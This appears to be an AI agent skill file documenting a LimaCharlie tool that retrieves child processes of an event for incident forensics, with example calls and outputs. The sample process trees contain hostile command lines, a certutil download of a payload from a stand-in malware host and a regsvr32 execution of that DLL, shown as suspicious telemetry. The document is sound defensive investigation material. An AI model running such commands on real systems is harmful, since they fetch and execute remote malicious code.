
# Get Atom Children

Get all children (descendants) of a specific atom from LimaCharlie Insight.

## When to Use

Use this skill when the user needs to:
- Trace the full process tree from a parent process
- Investigate all activity spawned by a suspicious process
- Build forensic timelines following process ancestry
- Find child processes spawned by malicious activity
- Map the execution chain from initial compromise
- Identify all descendants of a known-bad process

Common scenarios:
- "Show me all processes spawned by this PowerShell instance"
- "What child processes did this suspicious executable create?"
- "Trace the process tree from this parent atom"
- "Find all activity originating from this malware dropper"
- "Get the execution chain starting from atom xyz..."

## What This Skill Does

This skill retrieves all child events (descendants) of a specific atom from LimaCharlie Insight. This is essential for process tree analysis, allowing you to see everything that was spawned from a parent event. Useful for tracing attack chains where a malicious process launches multiple child processes.

## Required Information

Before calling this skill, gather:

**Important**: The Organization ID (OID) is a UUID (like `c1ffedc0-ffee-4a1e-b1a5-abc123def456`), **NOT** the organization name. If you don't have the OID, use the `list_user_orgs` skill first to get the OID from the organization name.

- **oid**: Organization ID (UUID format, required)
- **sid**: Sensor ID (UUID format) where the events originated (required)
- **atom**: The parent atom identifier to get children for (required)

**Where to find parent atoms:**
- In event data: `routing.this` field contains the event's own atom
- In process events: This is the process you want to trace children from
- From `get_event_by_atom` results: Use the event's atom as parent

## How to Use

### Step 1: Validate Parameters

Ensure you have:
1. Valid organization ID (oid)
2. Valid sensor ID (sid) - the sensor where the events occurred
3. Valid parent atom identifier - the event whose children you want

### Step 2: Call the Tool

Use the `lc_call_tool` MCP tool:

```
mcp__plugin_lc-essentials_limacharlie__lc_call_tool(
  tool_name="get_atom_children",
  parameters={
    "oid": "c7e8f940-1234-5678-abcd-1234567890ab",
    "sid": "xyz-sensor-id",
    "atom": "1a2b3c4d5e6f7g8h9i0j..."
  }
)
```

**Tool Details:**
- Tool name: `get_atom_children`
- Parameters:
  - `oid`: Organization ID (required)
  - `sid`: Sensor ID (required)
  - `atom`: Parent atom identifier (required)

### Step 3: Handle the Response

The tool returns an array of child events:
```json
{
  "children": [
    {
      "event": {
        "TIMESTAMP": 1705761235000,
        "EVENT_TYPE": "NEW_PROCESS",
        "FILE_PATH": "C:\\Windows\\System32\\cmd.exe",
        "COMMAND_LINE": "cmd.exe /c whoami",
        "PROCESS_ID": 5678
      },
      "routing": {
        "this": "child-atom-1...",
        "parent": "1a2b3c4d5e6f7g8h9i0j...",
        "sid": "xyz-sensor-id",
        "hostname": "SERVER01"
      }
    },
    {
      "event": {
        "TIMESTAMP": 1705761236000,
        "EVENT_TYPE": "NEW_PROCESS",
        "FILE_PATH": "C:\\Windows\\System32\\certutil.exe",
        "COMMAND_LINE": "certutil -urlcache -split -f http://...",
        "PROCESS_ID": 5679
      },
      "routing": {
        "this": "child-atom-2...",
        "parent": "1a2b3c4d5e6f7g8h9i0j...",
        "sid": "xyz-sensor-id",
        "hostname": "SERVER01"
      }
    }
  ]
}
```

**Success:**
- Returns array of all child/descendant events
- Each event includes full event data and routing metadata
- Children include their own atoms for further navigation
- Results are typically in chronological order

**Common Errors:**
- **404 Not Found**: Parent atom or sensor does not exist
- **403 Forbidden**: Insufficient permissions or data retention expired
- **400 Bad Request**: Invalid parameter format

### Step 4: Format the Response

Present the result to the user:
- Show count of child events found
- Display as a tree or timeline
- Highlight suspicious child processes
- Show command lines for process events
- Indicate if children have their own children

**Example formatted output:**
```
Children of atom 1a2b3c4d... (Parent: powershell.exe)
Sensor: SERVER01 (xyz-sensor-id)
Total children: 3

Process Tree:
[14:22:15] powershell.exe (parent - atom: 1a2b3c4d...)
  |
  +-- [14:22:16] cmd.exe (child-atom-1...)
  |     Command: cmd.exe /c whoami
  |
  +-- [14:22:17] certutil.exe (child-atom-2...)    [SUSPICIOUS]
  |     Command: certutil -urlcache -split -f http://malware.com/payload.exe
  |
  +-- [14:22:20] regsvr32.exe (child-atom-3...)    [SUSPICIOUS]
        Command: regsvr32 /s /n /u payload.dll

To investigate a child further:
- Use get_event_by_atom with the child's atom
- Use get_atom_children on a child to see its descendants
```

## Example Usage

### Example 1: Investigate suspicious PowerShell

User has identified a suspicious PowerShell execution and wants to see what it spawned:

```
mcp__plugin_lc-essentials_limacharlie__lc_call_tool(
  tool_name="get_atom_children",
  parameters={
    "oid": "c7e8f940-1234-5678-abcd-1234567890ab",
    "sid": "srv-456",
    "atom": "powershell-atom-id..."
  }
)
```

Result shows cmd.exe and certutil.exe spawned - indicates download activity.

### Example 2: Full attack chain from dropper

User found a malware dropper and wants to trace the entire attack:

1. Get children of dropper process:
```
mcp__plugin_lc-essentials_limacharlie__lc_call_tool(
  tool_name="get_atom_children",
  parameters={
    "oid": "c7e8f940-1234-5678-abcd-1234567890ab",
    "sid": "workstation-123",
    "atom": "dropper-atom..."
  }
)
```

2. For each interesting child, recursively get its children to build full tree.

### Example 3: Combined with get_event_by_atom

Complete process tree investigation:

1. Start with a known event atom (from detection or alert)
2. Use `get_event_by_atom` to get full details
3. Use `get_atom_children` to see what it spawned
4. Navigate up using parent atom, down using children

```
# Get the initial event
get_event_by_atom(oid, sid, "initial-atom")
# Returns event with routing.parent = "parent-atom"

# Get parent process
get_event_by_atom(oid, sid, "parent-atom")

# Get all children of the suspicious process
get_atom_children(oid, sid, "initial-atom")
# Returns all spawned processes
```

## Investigation Patterns

### Process Tree Analysis

For comprehensive process tree investigation:

1. **Start point**: Get the suspicious event with `get_event_by_atom`
2. **Go up**: Use `routing.parent` atom to trace ancestry (repeat `get_event_by_atom`)
3. **Go down**: Use `get_atom_children` to find all descendants
4. **Breadth**: Iterate through children, call `get_atom_children` on each

### Attack Chain Mapping

```
[Initial Access] -> [Dropper] -> [Payload] -> [C2/Persistence]
     ^                 ^            ^              ^
     |                 |            |              |
  get_event      get_children  get_children   get_children
```

## Additional Notes

- **Recursive traversal**: Children may have their own children - traverse recursively for full tree
- **Performance**: More efficient than LCQL queries when you have specific atoms
- **Event types**: Children include all event types, not just NEW_PROCESS
- **Retention**: Child events subject to same data retention as parent
- **Forensic value**: Essential for understanding attack execution flow
- **Combine with LCQL**: Use atom-based navigation for precision, LCQL for broad searches

## Related Functions

- `get_event_by_atom` - Get a specific event by its atom (navigate up via parent)
- `get_historic_events` - Query events by time range (alternative when atoms unknown)
- `run_lcql_query` - Complex queries across multiple sensors or patterns

## Reference

For more details on using `lc_call_tool`, see [CALLING_API.md](../../../CALLING_API.md).

For the MCP tool implementation, check: `../lc-mcp-server/internal/tools/historical/historical.go`
